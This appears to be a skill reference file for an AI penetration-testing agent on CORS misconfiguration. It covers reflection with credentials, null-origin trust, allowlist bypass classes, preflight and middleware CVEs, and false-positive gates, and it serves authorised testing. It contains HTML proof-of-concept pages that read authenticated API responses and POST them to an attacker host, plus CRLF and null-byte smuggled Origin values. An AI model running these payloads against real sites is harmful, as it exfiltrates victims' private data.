---
name: cors-misconfiguration
description: "CORS misconfiguration testing — Access-Control-Allow-Origin + Allow-Credentials interaction, origin reflection, null-origin trust, regex/allowlist bypass classes, scheme/port confusion, framework-middleware defaults, with Fetch-standard confirmation discipline and false-positive gates."
---

# CORS Misconfiguration

CORS misconfiguration is a trust-boundary failure between the browser's same-origin policy and the server's declared cross-origin trust: a server that reflects an attacker-controlled Origin header into `Access-Control-Allow-Origin` while also returning `Access-Control-Allow-Credentials: true` grants attacker-controlled JavaScript the right to make credentialed cross-origin reads of the authenticated API. The browser is spec-compliant; the server's trust declaration is the vulnerability.

The finding is **not** that a server echoes the Origin header — a spec-compliant deployment may do so legitimately. The finding is the combination that reads authenticated response bodies cross-origin: an echoed/reflected Origin AND `Access-Control-Allow-Credentials: true` AND an endpoint that returns protected data under session/token/cert authentication. Any of the three alone is not a finding; the three together are.

Load `cors_misconfiguration_advanced_deep` for allowlist-bypass depth (null origin, regex escape, prefix/suffix match, trailing-slash, scheme/port, subdomain-takeover-fed allowlists), middleware-default surface (Flask-CORS cluster, Fiber, Hono, elysia-cors, Spring, AWS API Gateway HTTP APIs), preflight + Private Network Access depth, and chained exploitation. Load `cors_misconfiguration_novel_deep` for the 2024–2026 verified middleware-default CVE catalog (version metadata single-owner) and the bounded reasoning for why the CORS novel-tier frontier is middleware-default-dominant rather than new browser-level technique classes. Overlapping surfaces route by filename: `csrf` for state-change invariant where CORS-relaxed is the CSRF upgrade; `information_disclosure` for disclosure framings; `browser_security` for broader site-isolation and the Private Network Access (PNA) permission model; `subdomain_takeover` for the allowlist-feeding primitive.

## Standards Mapping

- **Fetch standard (WHATWG)** — the normative definition of CORS, including §3.2.4 (credentials-mode `include`) and §3.3.5 (CORS protocol and credentials). The browser rejects wildcard-origin + credentials combinations per spec; the exploitable configuration requires exact-origin reflection, not wildcard.
- **OWASP WSTG — Testing for CORS** (`WSTG-CLNT-07`): base-tier methodology anchor; the "check whether `Access-Control-Allow-Credentials: true` is set when the Origin is reflected" rule is the canonical confirmation signal.
- **OWASP ASVS 5.0.0** V14 (Configuration) and V13 (API & Web Service) carry the CORS-relevant controls; cite ASVS 5.0 identifiers, not 4.0 (edition renumber at May 2025).
- **MDN** on `Access-Control-Allow-Credentials` — primary reference for the browser-side enforcement: wildcard + credentials is browser-rejected; `null` origin + credentials is browser-permitted (and exploitable).

## Attack Surface

**Authenticated API endpoints**
- Endpoints whose responses contain user-specific data (profile, settings, transaction history, admin resources, API keys) and are reachable via cookie/Authorization/Client-Cert auth

**Endpoints with Allow-Credentials: true**
- Any response carrying `Access-Control-Allow-Credentials: true` alongside a non-null `Access-Control-Allow-Origin` is a candidate; verify the Origin reflection shape and the authentication requirement

**Server-side allowlist implementations**
- Hand-rolled allowlist checks (substring match, prefix/suffix match, regex, JSON-array-contains) are the primary bypass surface
- Framework middlewares with defaults that admit attacker origins (see novel sibling for CVE instances)
- Reverse-proxy / CDN rules that strip or add CORS headers inconsistently with the application

**Preflight-triggering endpoints**
- Methods beyond simple-request (`GET`, `HEAD`, `POST` with `application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain`), custom headers, or non-standard content types trigger preflight
- A permissive preflight (`Access-Control-Allow-Headers: *`, `Access-Control-Allow-Methods: *`) following a reflected-Origin response completes the cross-origin write-side capability

**Private-network endpoints**
- Internal services exposed on `127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`
- Chrome's Private Network Access (PNA) model introduces new preflight headers (`Access-Control-Request-Private-Network` / `Access-Control-Allow-Private-Network`); novel sibling owns the PNA depth

## High-Value Targets

- Authenticated APIs returning user-identifiable or secret content (profile data, API keys, OAuth tokens, PII)
- Admin APIs on `admin.target.tld` or `/admin/*` paths where the allowlist includes trusted subdomains
- OAuth / OIDC provider endpoints whose authorization responses include tokens
- Internal / private-network services that assume network isolation and lack per-request authentication
- GraphQL `/graphql` endpoints with introspection enabled and permissive CORS
- APIs behind reverse proxies where the proxy adds CORS headers overriding the application's intent

## Reconnaissance

### Origin Reflection Fingerprinting

```bash
# Baseline: observe response headers to an authenticated endpoint
curl -sIH 'Origin: https://evil.tld' -b 'session=…' https://target.tld/api/account

# Minimal confirmation: did the server reflect the attacker Origin into ACAO
# AND set ACAC: true?
# Example vulnerable response:
#   Access-Control-Allow-Origin: https://evil.tld
#   Access-Control-Allow-Credentials: true
```

Variations to probe:
- `Origin: https://evil.tld` — baseline cross-origin
- `Origin: null` — sandboxed iframe / data: / blob: shape
- `Origin: https://target.tld.evil.tld` — suffix-match-bypass candidate
- `Origin: https://evil.target.tld` — prefix-match-bypass candidate
- `Origin: https://trusted.target.tld` — subdomain-takeover feed candidate
- `Origin: http://target.tld` — scheme-downgrade candidate
- `Origin: https://target.tld:8443` — port-mismatch candidate
- `Origin: https://target.tld/` — trailing-slash normalization candidate

### Preflight Request Mapping

```bash
curl -sIX OPTIONS -H 'Origin: https://evil.tld' \
     -H 'Access-Control-Request-Method: PUT' \
     -H 'Access-Control-Request-Headers: Authorization' \
     https://target.tld/api/account
```
Observe:
- `Access-Control-Allow-Origin` on the preflight response — same reflection as the actual request
- `Access-Control-Allow-Methods` — write-side authorized methods
- `Access-Control-Allow-Headers` — which headers the attacker can forward
- `Access-Control-Allow-Credentials` — if `true`, the preflight-granted request will carry cookies/Authorization

### Auth Context Fingerprinting

- Cookie-based auth: `SameSite` attribute determines cross-origin cookie travel; `SameSite=Strict` defeats most of this class, `SameSite=Lax` partial, `SameSite=None; Secure` full
- Authorization header auth: the attacker's JS cannot read the user's bearer token; CORS-relaxed-with-credentials does not expose header-based tokens unless the application echoes them (anti-pattern) OR the token is in a cookie
- Client-certificate auth: the browser attaches the cert on any cross-origin request where the server's mutual-TLS context accepts it; CORS-relaxed grants cross-origin read of the authenticated response body

## Key Vulnerabilities

### Naive Origin Reflection + Allow-Credentials: true

Primitive: the server reads `Origin` from the request, writes it back into `Access-Control-Allow-Origin`, and sets `Access-Control-Allow-Credentials: true`. Any attacker-controlled origin loads the resource with the victim's auth and reads the response body.

**Preconditions**:
- Server reflects the Origin header without allowlist validation
- Response carries `Access-Control-Allow-Credentials: true` on an authenticated endpoint
- The user's auth context travels on cross-origin iframe/fetch (`SameSite=None; Secure` cookie, or Authorization-via-cookie, or client-cert at the mutual-TLS layer)

**Attack recipe**:
```html
<!doctype html>
<html>
<body>
<script>
fetch('https://target.tld/api/account', {credentials: 'include'})
  .then(r => r.text())
  .then(body => fetch('https://evil.tld/log', {method:'POST', body}));
</script>
</body>
</html>
```
The victim visits `https://evil.tld/attack.html`; the browser issues the credentialed cross-origin request; the server responds with reflected Origin + ACAC:true; the browser permits the response body to reach the attacker's JS; the attacker exfils.

**Confirmation**: the attacker-side log receives the authenticated response body, not just the model saying "CORS allows." The confirmation is the exfil, witnessed at `https://evil.tld/log`.

**Impact**: full cross-origin read of the authenticated API; the attacker reads whatever the victim's session would read, from any attacker-authored page the victim visits.

**False-positive guard**: a server echoing Origin **without** `Access-Control-Allow-Credentials: true` is not a credentialed-read vulnerability — the browser will not send the user's cookies on the cross-origin request. State the finding only when both are present AND the endpoint carries authenticated response content.

### Wildcard Origin + Credentials — Browser-Rejected Dead Class

Primitive (as attempted): server emits `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.

**Per Fetch standard**: the browser rejects this combination. Credentialed requests fail; the response body does not reach the cross-origin JS.

**False-positive**: a scanner reporting "ACAO: * with ACAC: true" is reporting a server misconfiguration, not an exploitable CORS vulnerability. The server's misconfiguration still deserves fixing (it may signal broader allowlist problems), but it does not grant cross-origin read on its own.

**Exception — misreading the spec**: if the server also echoes credentials by other means (returning the session cookie in a non-cookie response header, embedding the bearer token in the response body as data, returning a copy of the request Authorization in a response header), the wildcard-origin case can still leak. The leak is of the echoed-credential, not of the credential's authority.

### Null Origin Trust

Primitive: the server accepts `Origin: null` as a trusted origin and sets `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true`. Any attacker page in a context that produces `Origin: null` (sandboxed iframe without `allow-same-origin`, `data:` URL, `blob:` URL under certain conditions) loads the resource with credentials and reads the response.

**Preconditions**:
- Server allowlist contains `null` (anti-pattern)
- Response carries ACAC:true

**Attack recipe**: the attacker's page frames the victim's authentication context inside a sandboxed iframe:
```html
<!-- https://evil.tld/attack.html -->
<iframe sandbox="allow-scripts" srcdoc="<script>
  fetch('https://target.tld/api/account', {credentials: 'include'})
    .then(r => r.text())
    .then(body => fetch('https://evil.tld/log', {method:'POST', body, mode:'no-cors'}));
</script>"></iframe>
```
The iframe's `Origin` header is `null`; the server's `null`-trusting allowlist admits the request; the attacker reads the response.

**Confirmation**: the exfil request reaches the attacker's endpoint.

**Finding threshold**: the server returning `ACAO: null` + `ACAC: true` on a request with `Origin: null` from an authenticated session is the finding, same shape as naive reflection.

### Allowlist Bypass Classes

Each class is a specific match-mistake that admits an attacker-controlled Origin into the allowlist's trust tuple. The one-line attack-recipe-shape per class (full attack recipes and confirmation signals at `cors_misconfiguration_advanced_deep.md § Regex Escape and Pattern-Match Bypass Classes` and `§ Advanced Origin-String Confusion`):

- **Regex-escape-dot**: allowlist regex `^https://(.*)\.trusted\.tld$` fails to escape the dot → attacker Origin `https://a.evilxtrusted.tld` (where `x` is any char at the `.` position) matches
- **Prefix match**: `startsWith('https://trusted.tld')` → attacker `https://trusted.tld.evil.tld` matches
- **Suffix match**: `endsWith('.trusted.tld')` → attacker `https://evilxtrusted.tld` or `https://a.trusted.tld.evil.tld` matches depending on anchor
- **Substring match**: `includes('trusted.tld')` → attacker `https://notexample.com` for `example.com` allowlist (textbook elysia-cors CVE-2025-50864 class, novel sibling)
- **Case-insensitive match**: allowlist lowercases but match semantics case-sensitive downstream → path-side case-insensitivity (Flask-CORS CVE-2024-6866) or host-side case shuffle
- **Trailing-slash normalization**: allowlist stores origins with/without trailing slash; attacker Origin with the opposite form matches via normalization mismatch
- **Scheme confusion**: allowlist entries for `https://trusted.tld` match attacker's `http://trusted.tld` if comparison is scheme-insensitive (or vice versa)
- **Port confusion**: allowlist entries without explicit port match attacker's non-default port
- **Subdomain-takeover feeding allowlist**: allowlist includes `https://*.trusted.tld`; attacker claims an unused subdomain via `subdomain_takeover` — the subdomain's origin is a legitimate match
- **Three-slash URL**: `Origin: https:///evil.tld` — some parsers mis-construct the authority; prefix allowlists admit
- **IDN / punycode origin**: homoglyph domains that visually mimic the allowlist (`trսsted.tld` with Armenian ս) bypass case-insensitive normalization
- **CRLF-in-origin**: `Origin: https://evil.tld\r\nX-Admin: true` — CRLF-injection class where the server reflects or forwards the raw header
- **Null-byte truncation**: `Origin: https://trusted.tld\x00https://evil.tld` — C-string parsers truncate at null

Each class has specific attack recipes and confirmation signals; load the advanced sibling for the full treatment.

### Preflight Allow-Headers Expansion

Primitive: the preflight response's `Access-Control-Allow-Headers` reflects the request's `Access-Control-Request-Headers` or returns `*`. The attacker can forward arbitrary headers on the subsequent request — including custom auth headers the server treats as trusted — turning a CORS misconfiguration into a header-smuggling primitive.

Route to `header_injection` for the server-side consequence of trusted-header-forwarding, and to `cors_misconfiguration_advanced_deep.md § Preflight + PNA` for depth.

### Private-Network Access (PNA) Preflight Trust

Primitive: an internal service at `192.168.x.x` or `127.0.0.1` responds to a preflight with `Access-Control-Allow-Private-Network: true`, permitting external pages to issue cross-origin credentialed requests against private-network services.

Chrome's PNA model owns the current enforcement surface; the Flask-CORS CVE-2024-6221 cluster is the primary CVE-level instance (version metadata at `cors_misconfiguration_novel_deep.md § Private-Network Access`). Browser-side enforcement rollout is in flux as of 2026 and the file flags it as unverified-current.

## Framework Middleware Routing

Specific middleware default behavior and the 2024–2026 CVE catalog are in the advanced and novel siblings:

- **Flask-CORS (Python)** — three CVEs (unquote_plus desync CVE-2024-6844, case-insensitive path CVE-2024-6866, PNA default-true CVE-2024-6221) → `cors_misconfiguration_novel_deep.md § Flask-CORS Middleware Cluster`
- **Fiber v2 (Go)** — wildcard-origin + credentials pre-fix CVE-2024-25124 → `cors_misconfiguration_novel_deep.md § Fiber v2`
- **Hono (JS)** — naive-origin-reflection with credentials CVE-2026-54290 → `cors_misconfiguration_novel_deep.md § Hono`
- **elysia-cors (JS/Bun)** — substring-match origin validation CVE-2025-50864 → `cors_misconfiguration_novel_deep.md § elysia-cors`
- **Spring Framework (@CrossOrigin, WebMvcConfigurer)** — default all-origins, credentials-off-by-default; 5.3+ hard-rejects wildcard-origin + allowCredentials startup → `cors_misconfiguration_advanced_deep.md § Spring @CrossOrigin`
- **AWS API Gateway (HTTP APIs)** — AllowOrigins accepts `https://*` and `http://*` scheme-prefix wildcards → `cors_misconfiguration_advanced_deep.md § AWS API Gateway`
- **expressjs/cors (Node)** — the `origin: true` + `credentials: true` combination reflects any origin → `cors_misconfiguration_advanced_deep.md § expressjs/cors Dynamic Function Pitfall`

## Confirmation and Validation Discipline

The §5 confirmation discipline is strict:

1. **Echo of Origin alone is NOT a finding**. A server returning `Access-Control-Allow-Origin: https://evil.tld` without `Access-Control-Allow-Credentials: true` is spec-compliant: the browser will not carry credentials on the cross-origin fetch. The response body may be readable cross-origin, but the response is the pre-auth / non-authenticated version.

2. **Echo of Origin + ACAC:true + authenticated endpoint IS the finding**. All three conditions. The attacker's JS reads the authenticated response body. Reproduce from a browser; capture the exfil at the attacker endpoint.

3. **Wildcard + credentials is a browser-rejected dead class** — not an exploitable finding by itself (see § Wildcard Origin + Credentials — Browser-Rejected Dead Class). Document as a configuration issue; the exploitability requires an additional non-cookie credential-echo path.

4. **Null origin + ACAC:true + authenticated endpoint IS a finding** — the browser carries credentials on `Origin: null` cross-origin requests when the server allows them.

5. **PortSwigger "four-step practical methodology" framing is refuted** — do not frame the methodology as a four-step playbook; the Fetch-standard confirmation rule above is the authoritative framing.

6. **The pentester's reproduction**: PoC HTML served from the attacker's origin, fetched by a victim with an active session at the target, response body captured at the attacker's exfil endpoint. A `curl` reproduction demonstrates server behavior; a browser reproduction demonstrates the actual CORS flow.

## Chaining and Routing

Upstream (what delivers a CORS finding into an engagement):

- `reconnaissance/web_api_recon` for API endpoint discovery
- `subdomain_takeover` for taking over an unused subdomain that appears in a wildcard allowlist
- `xss` on the target's origin — if an attacker-controlled same-origin page exists, same-origin CORS is bypassed trivially

Downstream (what a CORS finding enables):

- Cross-origin authenticated read → confidentiality bypass of the authenticated endpoint
- Cross-origin authenticated write (where preflight is permissive) → state-change: route to `csrf` for the state-change invariant distinction
- Combined with `open_redirect` → the attacker delivers the victim to a page that performs the CORS attack with the user's session
- Combined with `clickjacking` → different cross-origin primitive (write-side vs read-side); the two classes are orthogonal

Composite chains:
- Subdomain-takeover → allowlist feed → CORS credentialed read → account data exfil
- XSS on a trusted-allowlist origin → attacker-controlled same-origin fetch → full CORS circumvention via same-origin trust
- CORS preflight-permissive write → combined with CSRF-shape state change → cross-origin write of attacker-chosen state

## Testing Methodology

1. **Enumerate authenticated endpoints** that return user-identifiable or secret data
2. **For each endpoint, probe Origin reflection**: send known cross-origin shapes; capture ACAO and ACAC in the response
3. **For each endpoint, run the preflight probe**: observe which methods and headers the preflight permits
4. **Classify the reflection shape**: naive reflection vs allowlist-matched (and if matched, test the bypass classes in `cors_misconfiguration_advanced_deep`)
5. **Verify the confirmation three-condition rule**: echo + ACAC:true + authenticated content. If any condition fails, the finding is not credentialed-cross-origin-read.
6. **Reproduce via browser**: PoC HTML page served from attacker origin, victim session active at target, exfil capture at attacker endpoint
7. **For PNA concerns**, verify private-network reachability + `Access-Control-Allow-Private-Network: true` on the private service; route to novel sibling for the CVE-level depth
8. **For middleware-default suspicions**, check deployed middleware version against the CVE catalog in `cors_misconfiguration_novel_deep.md`

## Validation

1. State the data-exposure invariant the misconfiguration violates ("the authenticated `/api/account` response must not be readable from `https://evil.tld`")
2. Reproduce from the attacker-authored HTML page, served from a cross-origin host, with the victim's authenticated session
3. Capture the exfiltrated response body at the attacker's exfil endpoint; the response body is the primary evidence
4. For preflight-dependent findings, capture the preflight exchange showing the permissive methods/headers
5. For null-origin findings, demonstrate reproduction via sandboxed iframe (`sandbox="allow-scripts"`); confirm `Origin: null` is on the server-side request logs

## False Positives

- Response has `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`: browser rejects; not credentialed-cross-origin-read (document as configuration issue; not an exploitable finding on its own)
- Response has reflected Origin but no `Access-Control-Allow-Credentials: true`: not credentialed; the response is non-authenticated or the browser will not carry credentials
- Endpoint returns no user-identifiable content (public resource): no confidentiality to lose
- Target uses `SameSite=Strict` cookies for auth: the credentialed-cross-origin fetch does not carry the auth cookie; browser-defeated
- Target uses Authorization-header auth that the attacker's JS cannot set cross-origin without the user's token: no credential travels
- Scanner reports "CORS misconfiguration" based on headers alone without validating the browser-side exploitability

## Impact

- Full cross-origin read of authenticated API responses: user profile, settings, transaction history, admin resources, API keys embedded in responses
- Cross-origin credentialed write (where preflight permits): state changes attributed to the victim
- Supply-chain compromise via trusted-subdomain-takeover feeding a wildcard allowlist
- Private-network reads (via PNA misconfiguration): internal services exposed to external pages the user visits
- Reputational / regulatory: GDPR / HIPAA / PCI data exfil through a browser-mediated cross-origin read

## Pro Tips

1. The three-condition confirmation rule (echo + ACAC:true + authenticated content) is the gate — do not report CORS findings without all three
2. Wildcard + credentials is a scanner false-positive magnet; verify the browser-side exploitability before claiming
3. `Origin: null` is a bypass-friendly value because `sandbox="allow-scripts"` iframes and `data:` URLs produce it from attacker-controlled pages
4. The 2024–2026 live frontier is middleware-default CVEs (Flask-CORS, Fiber, Hono, elysia-cors), not new browser-level technique classes — check the deployed middleware version
5. Spring's `@CrossOrigin` default is all-origins but credentials-off; the pre-5.3 wildcard+credentials startup is possible with explicit `allowCredentials=true` — audit for the explicit setting
6. AWS API Gateway HTTP APIs' `AllowOrigins` field accepts `https://*` and `http://*` scheme-prefix wildcards — do not assume `*` is the only wildcard
7. Chrome PNA headers are documented but the rollout timeline is in flux; the primitive exists but the browser-level enforcement is version-dependent
8. For GraphQL `/graphql` with introspection enabled, CORS misconfiguration elevates to schema-dump-cross-origin — a quick-win finding
9. The confirmation is the exfiltrated response body at the attacker's endpoint, not the response headers alone

## Summary

CORS misconfiguration is the server-side trust-declaration failure that the browser's Fetch standard reads as "it is safe to carry credentials cross-origin." The attack-surface is naive origin reflection + `Access-Control-Allow-Credentials: true` on authenticated endpoints — the three-condition confirmation rule is the gate separating a finding from a scanner false positive. The 2024–2026 frontier is middleware-default CVEs across Flask-CORS, Fiber, Hono, and elysia-cors (version metadata single-owned by the novel sibling); the browser-level technique frontier is comparatively mature. Load `cors_misconfiguration_advanced_deep` for allowlist-bypass depth, middleware-default surface, preflight + PNA depth, and chained exploitation; load `cors_misconfiguration_novel_deep` for the verified CVE catalog and the bounded reasoning for the mature-class frontier.
